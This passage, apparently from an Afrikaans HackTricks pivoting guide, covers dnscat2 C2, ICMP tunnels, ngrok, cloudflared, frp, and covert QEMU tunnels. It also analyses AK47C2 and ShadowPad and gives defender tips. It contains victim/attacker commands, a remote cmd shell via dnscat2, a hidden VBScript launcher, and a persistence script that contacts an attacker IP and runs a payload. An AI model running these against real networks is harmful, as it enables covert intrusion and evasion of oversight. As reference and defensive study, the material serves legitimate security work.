Dnscat2 stel ’n geënkripteerde command-and-control-kanaal deur DNS op; die server- en client-opdragte hieronder volg die gedokumenteerde gebruik daarvan.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om 'n dnscat2-client in PowerShell te laat loop; sy README dokumenteer die `Start-Dnscat2`-parameters wat hieronder gewys word.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding met dnscat**

Dnscat2 se interactive `listen`-opdrag koppel ’n plaaslike listener aan ’n afgeleë host en poort.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains-ng haak dinamies-gelinkte TCP-verbindings in en kan nie UDP of ICMP dra nie; DNS-proxying is konfigureerbaar, dus inspekteer die geïnstalleerde `proxychains.conf` en resolver-helper eerder as om ’n vaste publieke resolver te aanvaar. Legacy `proxyresolv`-scripts stel `PROXY_DNS_SERVER` bloot om die resolver te kies; gebruik ’n resolver wat vanaf die pivot bereikbaar is wanneer interne name benodig word.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Die Storm-2603-akteur het ’n **dual-channel C2 ("AK47C2")** geskep wat *slegs* uitgaande **DNS**- en **plain HTTP POST**-verkeer misbruik – twee protokolle wat selde op korporatiewe netwerke geblokkeer word.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Genereer ’n ewekansige 5-karakter SessionID (bv. `H4T14`).
• Voeg `1` vir *task requests* of `2` vir *results* vooraan en kombineer verskillende velde (flags, SessionID, rekenaarnaam).
• Elke veld word **XOR-geënkripteer met die ASCII-sleutel `VHBD@H`**, hex-geënkodeer en met punte aan mekaar geheg – en eindig uiteindelik met die aanvaller-beheerde domein:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests gebruik `DnsQuery()` vir **TXT**- (en fallback **MG**-)rekords.
• Wanneer die response 0xFF grepe oorskry, **fragmenteer** die backdoor die data in stukke van 63 grepe en voeg die merkers in:
`s<SessionID>t<TOTAL>p<POS>` sodat die C2-server hulle kan herrangskik.

2. **HTTP mode (AK47HTTP)**
• Bou ’n JSON-envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Die hele blob word XOR-`VHBD@H` → hex → as die body van ’n **`POST /`** met header `Content-Type: text/plain` gestuur.
• Die reply volg dieselfde enkodering en die `cmd`-veld word uitgevoer met `cmd.exe /c <command> 2>&1`.

Blue Team-notas
• Soek na ongewone **TXT queries** waarvan die eerste label lang hexadesimaal is en wat altyd met een seldsame domein eindig.
• ’n Konstante XOR-sleutel gevolg deur ASCII-hex is maklik om met YARA op te spoor: `6?56484244?484` (`VHBD@H` in hex).
• Vir HTTP, merk `text/plain` POST-bodies aan wat suiwer hex is en ’n veelvoud van twee grepe bevat.

{{#note}}
Die kanaal hou elke subdomein-label binne die 63-oktet DNS-limiet, maar protokolnakoming alleen maak dit nie stealthy nie; seldsame domeine, lang hexadesimale labels en query-volume bly opsporingsseine.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumenteer ’n IPv4-over-ICMP-tunnel wat ’n TUN-device en ICMP echo requests gebruik; die opstelling vereis voldoende privileges om die interface te skep.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng vervoer TCP-verbindings oor ICMP en gebruik die `-p`, `-l`, `-r` en `-R`-opsies wat hieronder getoon word vir die proxy, plaaslike listener, bestemmingsgasheer en bestemmingspoort.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) is ’n agent om plaaslike netwerkdienste aanlyn beskikbaar te stel deur ’n veilige tonnel; sy CLI dokumenteer HTTP-, TCP- en file URL-endpunte, en die gedrukte eindpuntgasheernaam kan volgens die eindpunt en rekening verskil.<sup>[[39]](#references)</sup>

### Installasie

- Skep ’n rekening: https://ngrok.com/signup
- Laai die kliënt af:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Die agent ondersteun ook authentication- en TLS-opsies wanneer nodig.<sup>[[39]](#references)</sup>_

#### Tonneling van TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Lêers met HTTP blootstel
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Afluister van HTTP-oproepe

_Nuttig vir XSS,SSRF,SSTI ..._\
Die selfstandige agent stel sy HTTP-inspeksie-koppelvlak by verstek beskikbaar by `http://127.0.0.1:4040`; die koppelvlak is vir HTTP-verkeer.<sup>[[40]](#references)</sup>

#### Tunneling van interne HTTP-diens

Die `--host-header=rewrite`-opsie herskryf die upstream HTTP-`Host`-header om by die plaaslike diens te pas.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasievoorbeeld

Dit gebruik ngrok Agent Config v2; benoemde tunnels gebruik `proto` en `addr` en word met `ngrok start` begin.<sup>[[42]](#references)</sup> Dit open 3 tunnels:

- 2 TCP
- 1 HTTP met bediening van statiese lêers vanaf /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel se `cloudflared`-connector stel uitgaande verbindings daar; gepubliseerde toepassings kan HTTP, HTTPS, TCP, SSH en RDP roeteer, terwyl quick tunnels vir HTTP-ontwikkeling bedoel is.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5-oorsprong (verouderde modus)

Die verouderde `--socks5`-vlag dui aan `cloudflared` dat die plaaslike oorsprong SOCKS5 praat; dit skep nie ’n plaaslike SOCKS5-luisteraar nie. Vir ’n bestuurde tunnel konfigureer `originRequest.proxyType: socks` SOCKS5-oorspronghantering.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Volgehoue tunnels met DNS

Lokaal bestuurde tunnelkonfigurasie gebruik die kleinletter-`tunnel`-, `credentials-file`- en `url`-sleutels soos hieronder getoon.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Begin die connector:
```bash
cloudflared tunnel run mytunnel
```
Die connector stel uitgaande verbindings daar en onderhandel by verstek QUIC met terugval na HTTP/2; moenie aanvaar dat elke deployment TCP/443 gebruik nie. Laat dit loop met slegs die voorregte wat deur jou deployment vereis word.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is ’n Go reverse proxy wat **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX en XTCP** ondersteun. XTCP gebruik P2P hole punching, waarvan die sukses van NAT afhang. Vanaf **v0.53.0** kan dit as ’n **SSH Tunnel Gateway** optree, sodat ’n teikenhost die standaard OpenSSH-kliënt sonder ’n `frpc`-binary kan gebruik.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassieke reverse TCP-tonnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Gebruik die nuwe SSH-gateway (geen frpc-binêre lêer nie)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip:9000** met die standaard OpenSSH-kliënt, terwyl `frps` die gateway verskaf.<sup>[[50]](#references)</sup>

## Bedekte VM-gebaseerde tonnels met QEMU

QEMU se gebruikersmodus-netwerk vereis nie root- of administrateurvoorregte vir die virtuele netwerk nie, en `-netdev user,hostfwd=...` herlei TCP-, UDP- of UNIX-verbindings vanaf die gasheer na die gas.<sup>[[51]](#references)</sup> TrustedSec het ’n Tiny Core QEMU-VM en ’n poging tot ’n omgekeerde SSH-tonnel gedokumenteer in ’n voorval waar gasheergerigte EDR aktiwiteit binne die gas kon mis.<sup>[[1]](#references)</sup>

### Vinnige eenreëlopdrag
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Die opdrag hierbo begin ’n **Tiny Core Linux**-guest met 256 MiB guest-geheue en ’n qcow2-skyfbeeld; die skyfbeeld is nie ’n in-RAM-skyf nie.
• Poort **2222/tcp** op die Windows-host word deursigtig na **22/tcp** binne die guest aangestuur.
• Vanuit die aanvaller se oogpunt stel die teiken bloot poort 2222 beskikbaar; enige pakkette wat dit bereik, word deur die SSH-bediener wat in die VM loop, hanteer.

### Stealthy bekendstelling deur VBScript

TrustedSec het VBS-gedrewe QEMU-bekendstellings en Tiny Core-beelde waargeneem in die voorval waarna hierbo verwys word.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` hou die venster versteek.<sup>[[1]](#references)</sup>

### Persistence binne die guest

Die aangehaalde voorval beskryf persistence in die stateless Tiny Core guest deur middel van `/opt/bootlocal.sh` en `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Plaas payload in `/opt/123.out`
2. Voeg by `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload tydens shutdown in `mydata.tgz` verpak word.

### Telemetrie-oorwegings

• Die host stel steeds die QEMU-proses, qcow2-image en enige listener wat deur die host geforward word, bloot.
• Slegs host-gebaseerde process scans ondersoek moontlik nie guest-prosesse nie, maar virtualization waarborg nie evasion nie; network-, QEMU- en image-telemetrie kan dit steeds blootlê.<sup>[[1]](#references)[[51]](#references)</sup>

### Wenke vir defenders

• Genereer ’n alert vir **onverwagte QEMU/VirtualBox/KVM-binaries** in user-writable paths.
• Blokkeer outbound connections wat van `qemu-system*.exe` afkomstig is.
• Hunt vir skaars listening ports (2222, 10022, …) wat onmiddellik ná ’n QEMU-launch bind.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Check Point beskryf ShadowPad se IIS-module as iets wat gekompromitteerde perimeter-webservers in backdoor- en relay nodes omskep deur URL-prefixes via `HttpAddUrl` te bind.<sup>[[3]](#references)</sup>

Dieselfde verslag beskryf die defaults, wildcard listeners, packet decryption, relay queues en debug-telemetrie wat hieronder opgesom word.<sup>[[3]](#references)</sup>

* **Config defaults** – indien die module se JSON-config waardes weglaat, val dit terug na geloofwaardige IIS-defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Op dié manier antwoord IIS op benign traffic met die korrekte branding.
* **Wildcard interception** – operators verskaf ’n semikolon-geskeide lys URL-prefixes (wildcards in host + path). Die module roep `HttpAddUrl` vir elke entry aan, sodat HTTP.sys matching requests na die malicious handler routeer; nonmatching requests val terug na normale IIS-gedrag.
* **Encrypted first packet** – die eerste twee bytes van die request body bevat die seed vir ’n custom 32-bit PRNG. Elke daaropvolgende byte word met die gegenereerde keystream ge-XOR voordat protocol parsing plaasvind:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – die module handhaaf twee lyste: “servers” (upstream nodes) en “clients” (downstream implants). Entries word verwyder indien geen heartbeat binne ongeveer 30 sekondes ontvang word nie. Wanneer albei lyste nie-leeg is nie, pair dit die eerste healthy server met die eerste healthy client en pipe eenvoudig bytes tussen hul sockets totdat een kant sluit.
* **Debug telemetry** – opsionele logging teken die source IP, destination IP en totale forwarded bytes vir elke pairing aan. Investigators het daardie breadcrumbs gebruik om die ShadowPad-mesh wat oor verskeie victims gestrek het, te herbou.

---

## Ander tools om na te gaan

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Versteek in die skaduwees: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Voor ToolShell: Verkenning van Storm-2603 se vorige ransomware-operasies](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Binne Ink Dragon: Onthulling van die relay network en inner workings van ’n stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Omseil Firewall/IDS-beperkings](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementering en spesifikasie](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: ’n CDN-Fronted Tailnet vanaf ’n BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
